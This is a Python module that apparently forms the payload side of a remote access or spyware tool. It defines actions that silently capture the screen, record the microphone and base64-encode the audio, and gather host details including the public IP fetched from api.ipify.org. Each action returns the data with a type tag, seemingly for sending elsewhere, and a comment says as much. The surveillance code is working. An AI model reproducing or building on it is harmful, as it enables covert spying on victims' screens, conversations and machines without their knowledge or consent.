import platform

import base64
import wave
import pyaudio
from requests import get

from PIL import ImageGrab
import io
import socket

# for audio

PYAUDIO = pyaudio.PyAudio()
chunk = 1024  # Record in chunks of 1024 samples
sample_format = pyaudio.paInt16  # 16 bits per sample
channels = 2
fs = 44100  # Record at 44100 samples per second
seconds = 3


class Actions:
    @staticmethod
    def screenshot():
        img = ImageGrab.grab()
        img.getdata()
        output = io.BytesIO()
        img.save(output, format='PNG')
        data = output.getvalue()
        id = "screenshot"
        return data, id

    @staticmethod
    def microphone(record_time=5):
        # I spend too much time on this action so decided to the the easy way...
        # to save audio file to local send it and delete

        audio_stream = PYAUDIO.open(format=sample_format,
                                    channels=channels,
                                    rate=fs,
                                    frames_per_buffer=chunk,
                                    input=True)

        audio_data = b''

        # Store data in chunks for 3 seconds
        for i in range(0, int(fs / chunk * record_time)):
            data = audio_stream.read(chunk)
            audio_data += data

        # audio data now contains a wav binary
        data_64 = base64.b64encode(audio_data)

        return data_64, 'audio'

    @staticmethod
    def write_wav_file(wavcontent64: bytes, filename: str):
        wf = wave.open(filename, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(PYAUDIO.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframesraw(base64.b64decode(wavcontent64))
        wf.close()

    @staticmethod
    def computer_information():
        content = ""
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            content += "Public IP Address: " + public_ip + '\n'

        except Exception:
            content += "Couldn't get Public IP Address (most likely max query" + '`\n`'

        content += "Processor: " + (platform.processor()) + '\n'
        content += "System: " + platform.system() + " " + platform.version() + '\n'
        content += "Machine: " + platform.machine() + "\n"
        content += "Hostname: " + hostname + "\n"
        content += "Private IP Address: " + IPAddr + "\n"
        id = 'computer_info'
        return content.encode(), id
